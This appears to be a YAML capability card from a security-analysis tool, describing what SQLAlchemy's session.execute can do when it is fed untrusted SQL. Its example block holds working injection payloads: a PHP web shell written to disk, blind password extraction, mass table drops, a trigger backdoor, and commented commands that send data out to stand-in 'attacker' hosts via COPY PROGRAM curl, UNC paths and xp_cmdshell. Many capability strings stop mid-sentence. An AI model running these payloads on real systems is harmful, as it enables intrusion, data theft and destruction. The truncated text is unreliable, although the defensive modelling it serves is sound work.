# SQLAlchemy session.execute

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-2169b129d65ace3b
api: SQLAlchemy session.execute
api_family: sqlalchemy.session.execute
runtime:
  language: python
  ecosystem: python-runtime
  package: sqlalchemy
  version: legacy-source-bound
capability_class: sql-exec
normative_authority: capability-facts-only
bound_sinks:
- db.cursor.execute
roles:
- role_id: content
  description: Legacy controlled role content.
  bindings:
  - expression: text
    caller_bindable: true
- role_id: statement
  description: Legacy controlled role statement.
  bindings:
  - expression: statement
    caller_bindable: true
facets:
- facet_id: legacy-facet-bf4b3d4f
  capability: Execute ANY valid SQL statement that the underlying database engine accepts
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-05a4f127
  capability: Accept multi-statement strings when the underlying driver permits them
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-794045d3
  capability: Arbitrary data exfiltration from EVERY table, view, and schema reachable by
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-7882cd05
  capability: 'Read arbitrary server-side files through database-specific functions:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-2ff5a0cd
  capability: 'Write arbitrary files to the server filesystem: `SELECT ... INTO'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-7f194599
  capability: Execute arbitrary OS commands on the database host through
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-c6ad069b
  capability: Escalate the database connection to OS-level code execution by writing a
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-da4e00b3
  capability: 'Perform Second-Order SQL Injection through database-resident mechanisms:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-724598c7
  capability: 'Create, alter, or drop database users and roles: `CREATE USER`,'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-ca283edc
  capability: 'Enable/disable database features that widen attack surface:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-676cbd9c
  capability: 'Access cross-database and cross-schema data: `SELECT * FROM'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-941be667
  capability: Perform blind data extraction through boolean-based or time-based side
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-0555db65
  capability: Use UNION-based injection to combine attacker-controlled results with benign
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-8acabb74
  capability: 'Stack queries to run independent statements in a single call:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-605bdd5c
  capability: 'Modify the database schema destructively: `DROP TABLE/DATABASE/INDEX`,'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-83e0807b
  capability: 'Leverage SQLite-specific attack surface when the backend is sqlite3:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-ac4f677b
  capability: 'Leverage PostgreSQL-specific extension points: `COPY ... PROGRAM` for'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-882b8bb9
  capability: 'Leverage MySQL/MariaDB-specific extension points: `LOAD DATA INFILE` for'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-817b7585
  capability: 'Leverage SQL Server-specific extension points (when using pyodbc/pymssql):'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-bac824ee
  capability: 'Leverage Oracle-specific extension points (when using cx_Oracle/oracledb):'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-0b3eb0b0
  capability: Exfiltrate data through out-of-band (OOB) channels, bypassing firewalls
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-891e3be4
  capability: 'Perform denial-of-service against the database: `SELECT SLEEP(9999)` or'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-edc0553e
  capability: 'Suppress errors to stay stealthy: wrap payloads in exception-handling'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-39d99aa2
  capability: 'Enumerate database metadata to map the attack surface:'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-5edee372
  capability: 'SQLAlchemy-specific pipelining of results: `session.execute()` returns a'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-b6ad10cd
  capability: 'SQLAlchemy-specific parameter binding with named placeholders: `text("'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
- facet_id: legacy-facet-7e401fc0
  capability: 'SQLAlchemy-specific statement composition abuse: the attacker-controlled'
  role_ids:
  - content
  - statement
  activation:
    any_of:
    - predicate: role-bound
      subject: content
      operator: equals
      value: true
    - predicate: role-bound
      subject: statement
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-ed648cf7
  role_id: null
  value: SQLAlchemy's `text(sql_string)` passes the raw SQL string to the
  security_effect: SQLAlchemy's `text(sql_string)` passes the raw SQL string to the
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-fb9047c5
  role_id: null
  value: The Session's `autoflush` behavior (defaults to `True`) automatically
  security_effect: The Session's `autoflush` behavior (defaults to `True`) automatically
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-9a316689
  role_id: null
  value: The Session's identity map does NOT filter, restrict, or validate SQL
  security_effect: The Session's identity map does NOT filter, restrict, or validate SQL
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-8da121ae
  role_id: null
  value: By default, the Session does NOT enforce statement-type restrictions.
  security_effect: By default, the Session does NOT enforce statement-type restrictions.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-dbb29bf8
  role_id: null
  value: Multi-statement execution is driver-dependent but the Session itself
  security_effect: Multi-statement execution is driver-dependent but the Session itself
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-6f1c49fc
  role_id: null
  value: The Session inherits the Engine's connection pool and dialect. If the
  security_effect: The Session inherits the Engine's connection pool and dialect. If the
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-f41e43fe
  role_id: null
  value: 'SQLAlchemy''s connection autocommit behavior is dialect-aware: on most'
  security_effect: 'SQLAlchemy''s connection autocommit behavior is dialect-aware: on most'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-2c963c9d
  role_id: null
  value: The Session caches compiled statement objects internally for performance.
  security_effect: The Session caches compiled statement objects internally for performance.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-fe041efa
  role_id: null
  value: The Session delegates to `connection.execute()` internally; all the
  security_effect: The Session delegates to `connection.execute()` internally; all the
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: "from sqlalchemy import create_engine, text\nfrom sqlalchemy.orm import Session\n\nengine = create_engine(\"sqlite:///:memory:\")\nsession = Session(engine)\n\n# Normal parameterized query execution\nsession.execute(text(\"CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)\"))\nsession.execute(\n    text(\"INSERT INTO users (name) VALUES (:name)\"), {\"name\": \"Alice\"}\n)\nresult = session.execute(\n    text(\"SELECT * FROM users WHERE name = :name\"), {\"name\": \"Alice\"}\n)\nrow = result.fetchone()\nassert row.name == \"Alice\"\nsession.commit()\n"
  capability_edge: "from sqlalchemy import create_engine, text\nfrom sqlalchemy.orm import Session\n\nengine = create_engine(\"sqlite:///:memory:\")\nsession = Session(engine)\n\n# 1) DDL — create attacker-chosen table\nsession.execute(text(\"CREATE TABLE backdoor (cmd TEXT)\"))\n\n# 2) DML with stacked statements — multi-statement in a single call\nsession.execute(text(\n    \"INSERT INTO backdoor VALUES ('malicious'); \"\n    \"SELECT * FROM backdoor\"\n))\n\n# 3) ATTACH DATABASE to pivot to another SQLite file (filesystem read)\nsession.execute(text(\"ATTACH DATABASE '/tmp/evil.db' AS evil\"))\n\n# 4) File write via ATTACH + CREATE TABLE (SQLite-specific)\nsession.execute(text(\"ATTACH DATABASE '/tmp/payload.db' AS pwnd\"))\nsession.execute(text(\"CREATE TABLE pwnd.evil (data TEXT)\"))\nsession.execute(\n    text(\"INSERT INTO pwnd.evil VALUES ('<?php system($_GET[c]);?>')\")\n)\n\n# 5) Blind time-based side channel (PostgreSQL example)\nsession.execute(text(\n    \"SELECT CASE WHEN (SELECT\
    \ substr(password,1,1) FROM users LIMIT 1)='a'\"\n    \" THEN pg_sleep(5) ELSE pg_sleep(0) END\"\n))\n\n# 6) Schema enumeration — discover all tables\nresult = session.execute(\n    text(\"SELECT name, sql FROM sqlite_master WHERE type='table'\")\n)\nschema = result.fetchall()\n\n# 7) Destructive: drop all user tables\nresult = session.execute(\n    text(\"SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'\")\n)\nfor (name,) in result.fetchall():\n    session.execute(text(f\"DROP TABLE IF EXISTS {name}\"))\n\n# 8) Second-order persistence via trigger:\n#    every future INSERT runs attacker SQL\nsession.execute(text(\"CREATE TABLE log (entry TEXT)\"))\nsession.execute(text(\n    \"CREATE TRIGGER trig_backdoor AFTER INSERT ON log \"\n    \"BEGIN \"\n    \"  INSERT INTO backdoor VALUES ('trigger fired on: ' || NEW.entry); \"\n    \"END\"\n))\nsession.execute(text(\"INSERT INTO log VALUES ('benign_input')\"))\n\n# 9) load_extension() — native code execution (SQLite)\n\
    # session.execute(text(\"SELECT load_extension('/path/to/evil.so')\"))\n\n# 10) PostgreSQL COPY ... PROGRAM — OS command execution\n# session.execute(text(\"COPY (SELECT '') TO PROGRAM 'curl http://attacker/?d=$(whoami)'\"))\n\n# 11) MySQL OOB exfiltration via UNC path (SMB callback)\n# session.execute(text(\n#     \"SELECT LOAD_FILE(CONCAT('\\\\\\\\\\\\\\\\', \"\n#     \"(SELECT password FROM users LIMIT 1), \"\n#     \"'.attacker.com\\\\\\\\share'))\"\n# ))\n\n# 12) Mixed named-param and injection through text()\nsession.execute(text(\n    \"SELECT * FROM users WHERE name = :name OR 1=1 --\"\n), {\"name\": \"doesntmatter\"})\n\n# 13) SQL Server xp_cmdshell for OS command execution\n# session.execute(text(\n#     \"EXEC xp_cmdshell 'powershell -enc <base64_payload>'\"\n# ))\n"
provenance:
- https://docs.sqlalchemy.org/en/20/core/connections.html#sqlalchemy.engine.Connection.execute — Session.execute delegates to connection.execute
- https://docs.sqlalchemy.org/en/20/orm/session_api.html#sqlalchemy.orm.Session.execute — Session.execute API reference
- https://docs.sqlalchemy.org/en/20/core/sqlelement.html#sqlalchemy.sql.expression.text — text() construct explicitly accepts raw SQL
- '{''CWE-89'': "Improper Neutralization of Special Elements used in an SQL Command (''SQL Injection'')"}'
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- https://portswigger.net/web-security/sql-injection — SQL injection techniques and cheat sheet
- https://www.sqlite.org/c3ref/exec.html — SQLite C API (underlies Python sqlite3 driver behind SQLAlchemy)
- https://www.postgresql.org/docs/current/sql-copy.html — PostgreSQL COPY (includes PROGRAM variant)
- https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql — SQL Server xp_cmdshell
- https://dev.mysql.com/doc/refman/8.4/en/load-data.html — MySQL LOAD DATA INFILE (includes LOCAL variant for SSRF)
```
